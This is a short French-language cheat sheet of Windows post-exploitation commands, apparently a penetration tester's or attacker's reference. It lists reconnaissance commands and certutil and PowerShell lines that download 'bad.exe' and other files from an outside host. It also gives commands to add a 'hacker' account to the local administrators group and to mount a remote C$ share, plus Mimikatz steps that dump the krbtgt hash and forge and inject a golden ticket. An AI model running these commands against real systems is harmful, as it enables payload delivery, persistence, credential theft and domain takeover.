<h2>Batch</h2>
<i>systeminfo</i> → Obtenir des renseignements sur le système</br>
<i>net users /domain [username]</i> → Obtenir des renseignements sur les utilisateurs</br>
<i>tasklist</i> → Lister les processus</br>
<i>netstat -ano</i> → Liste des connexions tcp</br>
<i>dir sysprep /s /b</i> → Trouver un fichier dans le repertoire courant et ses sous-dossiers</br>
<i>wmic qfe list</i> → Lister les patch installés (KB)</br>
<i>certutil.exe -urlcache -split -f "http://site.com/bad.exe" bad.exe</i> → Wget en batch</br>
<i>certutil.exe -decode bad.txt bad.exe</i> → Base64 decode en cmd</br>
<i>net user Domain/hacker hackerhacker /add</i> → Ajoute un utilisateur</br>
<i>net localgroup administrators hacker /add</i> → Ajoute un utilisateur à un groupe</br>
<i>net use k: \\srv.remote.org\c$</i> → Connexion au disque distant c sur la partition k</br>
<i>wmic useraccount where name='user'</i> → Récupère des informations sur un utilisateur (SID)</br>

<h2>Powershell</h2>
<i>{(New-Object System.Net.WebClient).DownloadFile("http://site.com/file", "C:\\Users\Public\file")}</i> → Wget en powershell</br>
get-WmiObject -class Win32_Share

<h2>Mimikatz</h2>
<i>privilege::debug</i></br>
<i>lsadump::lsa /inject /name:krbtgt</i> → Récupérer le NTLM hash de krbtgt</br>
<i>kerberos::golden /user:[USER] /domain:[DOMAINE] /sid:[SID de USER] /krbtgt:[NTLM hash de krbtgt] /ticket:evil.tck /ptt</i> → Créé et inject un golden ticket à la session</br>
